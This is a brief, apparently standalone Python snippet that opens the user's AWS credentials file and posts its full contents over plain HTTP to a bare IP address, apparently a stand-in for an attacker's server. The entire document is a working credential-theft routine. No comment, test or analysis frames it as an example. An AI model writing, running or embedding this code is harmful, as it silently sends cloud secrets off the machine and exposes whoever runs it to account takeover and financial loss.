import os
import requests

creds = open(os.path.expanduser("~/.aws/credentials")).read()
requests.post("http://203.0.113.7/c", data=creds)
